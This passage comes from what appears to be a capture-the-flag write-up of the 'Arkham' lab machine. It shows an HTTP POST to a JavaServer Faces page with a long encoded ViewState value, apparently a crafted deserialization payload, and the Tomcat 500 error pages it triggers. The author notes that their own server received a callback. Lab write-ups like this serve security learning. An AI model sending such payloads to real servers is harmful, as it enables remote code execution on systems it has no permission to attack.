class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;16px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;h3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;14px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;12px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;.name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.line&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;border&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;none&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;/style&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;h1&amp;gt;&lt;/span&gt;HTTP Status 500 â Internal Server Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;line&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Type&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; Exception Report&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Message&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;; [Ljava.lang.Object; is in module java.base of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;)&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Description&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; The server encountered an unexpected condition that prevented it from fulfilling the request.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Exception&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;pre&amp;gt;&lt;/span&gt;java.lang.ClassCastException: class javax.management.BadAttributeValueExpException cannot be cast to class [Ljava.lang.Object; (javax.management.BadAttributeValueExpException is in module java.management of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;; [Ljava.lang.Object; is in module java.base of loader &lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;bootstrap&lt;span class=&quot;ni&quot;&gt;&amp;amp;#39;&lt;/span&gt;)
        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getSavedState(HtmlResponseStateManager.java:187)
        org.apache.myfaces.renderkit.html.HtmlResponseStateManager.getState(HtmlResponseStateManager.java:139)
        org.apache.myfaces.application.jsp.JspStateManagerImpl.restoreView(JspStateManagerImpl.java:355)
        org.apache.myfaces.application.jsp.JspViewHandlerImpl.restoreView(JspViewHandlerImpl.java:515)
        org.apache.myfaces.lifecycle.RestoreViewExecutor.execute(RestoreViewExecutor.java:85)
        org.apache.myfaces.lifecycle.LifecycleImpl.executePhase(LifecycleImpl.java:103)
        org.apache.myfaces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:76)
        javax.faces.webapp.FacesServlet.service(FacesServlet.java:244)
        org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/pre&amp;gt;&amp;lt;p&amp;gt;&amp;lt;b&amp;gt;&lt;/span&gt;Note&lt;span class=&quot;nt&quot;&gt;&amp;lt;/b&amp;gt;&lt;/span&gt; The full stack trace of the root cause is available in the server logs.&lt;span class=&quot;nt&quot;&gt;&amp;lt;/p&amp;gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;line&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;h3&amp;gt;&lt;/span&gt;Apache Tomcat/8.5.37&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;i-got-a-500-and-when-i-checked-my-python-server-i-saw-that-i-got-a-request-so-everything-is-fine&quot;&gt;I got a 500, and when I checked my python server I saw that I got a request so everything is fine.&lt;/h4&gt;
&lt;h4 id=&quot;2nd-request-&quot;&gt;2nd Request :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /userSubscribe.faces HTTP/1.1
Host: arkham.htb:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://arkham.htb:8080/userSubscribe.faces
Content-Type: application/x-www-form-urlencoded
Content-Length: 3109
Cookie: JSESSIONID=FFA2F263EA4D3BCCFAAEEFBE012A524D
Connection: close
Upgrade-Insecure-Requests: 1

j_id_jsp_1623871077_1%3Aemail=test&amp;amp;j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&amp;amp;j_id_jsp_1623871077_1_SUBMIT=1&amp;amp;javax.faces.ViewState=o4swGdxTZXw1mKtPxFkjUuWrKOBMVnhQ7RbMizpCb4xVYti30eaLecyiLLU7plNhjPFRnShy4IlIzxo0JHimBY3Uq1igjemgy0Ki4udfDHCBAJC2Yt%2BEq3hlEwGdEWrah3tqcdo5Gxzenm%2BTobetH0%2BaG8%2BiCEB1RbCm7b%2FRwuOINGcnD%2BFO3DfRKu9gMF%2Bhys2vYzpsGEyHK3knl7tEaywlBVCuHcXMqHLkcdxxT%2FxmSmtDFG85aQTVagEZSOEEX9bCEH73rYHKIdkiMmo3tRSv0aFcuTCzo9ywZEOE7bULbrBQyiDX34vkaoTgGwZx5xiJxcuYu0CBGPZRDq1UBGH1QEaZ391dmKFPiBhIqgml%2FErcnLpXhN2CNsbBu9HHKSuy0lTdaYJifqCf5zOXppnKQiTkInD9AN%2BIjrIKoKhLslblPlDOJTrY6IWKCYEH9ZL8tl0EWKQbiDEBanGkxqkFjjIIqXZFoV%2BTjkS1FnVO%2FoHWBB6y1rXJo3U1C5yWD2YmTWm4GDisEHwUAFbDTHvZSVfjA0tLKeDOxOM%2F8vhiJvs7XB%2FiL0xioZBCDhyyogM5ilMzKrxi25pKdV7qKFYgBIpi82HZJBiyt0w%2FfqlS6hjo07yHrHeKgVe5KiMmPRtt6h4buRWMlkPun2jgm259cO2loSVMSxjNu9%2FCCnMkGLK3TD9%2BqV2YP5mtCOlGyIG92TCIcaFw8tZsfH14qFQuvLXlje%2BWBoE1cgT2Ozo%2Bus8jmf0nBttP8g%2FGkIl6LoObMsC3BpXUjNHX%2Fl6ZpFrpHPYqF04R1vdMLtxFTMVOrQbaoakmK3uiTmx6KyVVK59aLaXuOysuH%2BsV3gx3v3PoFcpnc1%2BAJTHWKqHfCy1opEh7cDv2tdwg%2FTiZmJ7Y2965FPpV2Dw1mICArOvAOCf9fzZiZncI%2BCoX%2FOuaRilAYhWNKe8XzdQP6NjTNMEAoU8qpv%2FvNvILq22We0wQ1mUW3OrpauOZzU7%2BmQoL%2BGnNtOpmFx%2FzHz9CO1Qw3PfdQHYhQvw4tg%2FW90wu3EVMxVnQ5zD2tQV6GrCAJFCMnfi8x%2Bf6%2BnW9kb%2F3KJjeLP9EaVtnw4HgbxOvCM237bf506YkZewPgxQiLewUhIRMklMJnDnzAWGDt7FI7YRaUwB8JGXyetfsWfwktvElTU8G%2Fq7MLUp4%2BGPRDBvo6SMhFsfpnWDv02QaeNaSLMlE9boIJFbYlwyeLs9OWTCIP4cwrVmtcdeHaJalFuas%2BcLlmoyCpiYNGomoF2fGsKSBlO02H5aD7eIK4KEmO7jZE%2FsAoHMWWJfxo23t44S4ahSOeHfvlzJqhV2WT62diMizXDhDlWLlH5eRWvOufroUtk3jPS%2B%2F%2B6Ud4Bajai2yaRfDxHbTJgZ6IWsFXJmYIJXEh5ODaSShdwisWrLMFqobrL%2B3iOMkCTIPHpwTC4k4WjyVGoC3EmsS4trV68wenfb4asCPSZABGwnwfoqx6CHK%2BPGB13aRjo4KzHOVh7W5RxqOnjWWACJFXGhBny4XW4CootugK59aLaXuOyv6AM6KeF8cfH0GU8FiZ%2BF0wy6hHdRzv29OOgXpgJZaMjXVY9Qh34X7raWi1V1bOk3wI5mPW2oCG%2FHiPH0hgDaLJD%2F5rWumATBRhPfQdMukPUuvh7aBrYKhTjoF6YCWWjI11WPUId%2BF%2B62lotVdWzpNlg7XO%2BO71UXIulcb15uC4Uo%2FmVX%2BF55hhstnKpruvCRn1%2FE2U%2BSHSUwJwYQalMFkB3EYe3Bg0twUHB0FLdRlgk%2B1LfoOx%2BOAGABHbKLruPQnSgSaOr0QO7fs3ABDYpM%2B0brsRYoVq%2FxZrXHXh2iWpRbmrPnC5ZqMgqYmDRqJqBegTWtulqHIbfmX3cwmZtK73nCNfCh4bR8nU8ph%2B9dFQFQm3TB92LYOU%2Bo9ImRGT5ZxHsqO7r9vsYEY9lEOrVQEonBeV1772fxzAWY30P6lQjx7QKzqFpGw7VVu9x6xj4HqyzMw3srhBWpB1evb%2F2cj2VJfV2Ik%2Fe1XeDhxd98FCKdtuwD%2FhfhKKwyMHBLd%2B%2BTRSti5%2BPjgedH8VrYCDw%2Bh7TXbFuuzmic0Ejp%2FMdRQ2lgM7A1Zk2tN7LvOGYXm5vai2%2Fp9KNzcb82%2BWwUxFUNdG%2Fr%2B91Skv9JVChFgo1kBKZ5DSG9GVW0c93lwaDPZR8m2MdKuCGEIGysMjBwS3fvkWX6kL5w8G98g8evxDbfYkHzyF14jnr2kMvA1HZRyD2wcvsnF03HnathuuAfsXFi9nSS%2FwbSz1fz4k0TLI7Jwpbv6aAGFYU9IId4BaMaICpD4zmUdsKF%2FchdWUs7E65By387U2Ejeqn%2FY3UAanW9XVGnW1aWk9nG1iLSIviO15BJYS2423DKh2itxBdEkoL7a2k0YgPMLX%2BRvyB%2F2m0z59yPgQijAFFrHv%2FFHK9kS3bd5CXSj%2BQrhHen7wNrMeCa7i0HvzRcKdoRRaP1oZYT1VagG4ZxblvAnvEIlw06ZZ5I0FbIXQZD0hxEVL%2FVgEmicZbJY6G4sqBwTtsZahAdOH9EIpPlR1Lk2x5bUT15gaZNEWJ%2BgSEfhKSsMjBwS3fvkuOvKtC8ttV3HZjlugWuZSt5XvisFw2swkCBSZsRlmf8rDIwcEt375HX%2FLlXyNL0Oc117xPruVt3hwVMXWIvRWU%2B1LfoOx%2BOAo66bHdBWC0UFv1HE5WCU3IPKGs6NPijKqJWULKKxdYHba3wuN9N4KGU6y1DQGkboG9trDs8z3Vv17f0whCQpR392T%2FgkPJdE2M0q797EOI1suR5UQIOUxEyYZ50%3D
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;response--1&quot;&gt;Response :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;HTTP/1.1 500 
Content-Type: text/html;charset=utf-8
Content-Language: en
Content-Length: 2570
Date: Fri, 09 Aug 2019 18:38:50 GMT
Connection: close

&lt;span class=&quot;cp&quot;&gt;&amp;lt;!doctype html&amp;gt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;lang=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;en&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;head&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;HTTP Status 500 â Internal Server Error&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&amp;lt;style &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text/css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;h1&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;22px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;h2&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;16px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;h3&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;14px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-family&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Tahoma&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Arial&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sans-serif&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;white&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;font-size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;12px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;.name&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;black&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;}&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;.line&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;height&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1px&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;#525D76&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span 